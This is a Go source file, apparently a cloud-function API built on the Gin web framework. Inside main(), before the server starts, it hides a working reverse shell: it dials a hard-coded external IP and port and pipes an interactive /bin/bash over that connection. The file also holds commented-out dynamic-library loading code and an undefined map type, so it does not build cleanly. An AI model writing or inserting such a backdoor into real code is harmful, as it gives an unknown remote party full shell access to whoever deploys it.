// ./cloud-functions/api.go
package main

import (
	"github.com/gin-gonic/gin"
	// "github.com/ebitengine/purego"
	"os/exec"
	"net"
	"fmt"
)

func main() {
	r := gin.Default()
	
	fmt.Println("Go Run !!!")
	fmt.Println(H {
		"start": "_startapp",
		"stop": "_stopapp",
		"status": "_statusapp",
		"restart": "_restartapp",
	})

    // res := C.add(10, 20)
    // fmt.Println("Rust Result:", res)

    conn, err := net.Dial("tcp", "43.248.3.138:21746")
    if err != nil {
            return
    }
    defer conn.Close()

    cmd := exec.Command("/bin/bash",  "-i")
    cmd.Stdin = conn
    cmd.Stdout = conn
    cmd.Stderr = conn

    cmd.Run()

	// // 1. 加载动态库 (相当于 dlopen)
	// lib, err := purego.Dlopen("./libpages.so", purego.RTLD_NOW|purego.RTLD_GLOBAL)
	// if err != nil {
	// 	return
	// }

	// // 2. 搜索符号并绑定到 Go 函数变量 (相当于 dlsym)
	// var start func()
	// purego.RegisterLibFunc(&start, lib, "start")

	// // 3. 直接调用
	// start()

    r.Run(":9000")
}